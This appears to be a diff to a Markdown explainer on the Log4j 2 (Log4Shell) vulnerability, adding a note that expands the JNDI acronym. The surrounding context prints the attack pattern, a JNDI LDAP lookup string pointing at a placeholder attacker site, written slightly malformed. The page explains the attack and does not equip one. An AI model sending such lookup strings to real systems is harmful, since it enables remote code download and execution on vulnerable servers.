@@ -29,9 +29,9 @@ Log4j 2, an updated version of Log4j, is a widely used and powerful logging fram
 
 #### How does the attacker precisely exploit the vulnerable Log4j 2? 
 Attackers exploit vulnerable Log4j 2 systems by sending data containing a specific string. Log4j 2, while attempting to process this string, accesses ***a specified URL through the JNDI Lookup feature***. This allows attackers to download and execute malicious Java code within the system.
+> **Note** : Java Naming and Directory Interface (JNDI)
 
 #### A specified URL?
-
 Here is the pattern of attack - **${indi:ldap//[attacker site]/a}**
 
 #### What commands were executed through the Log4j 2 exploit?
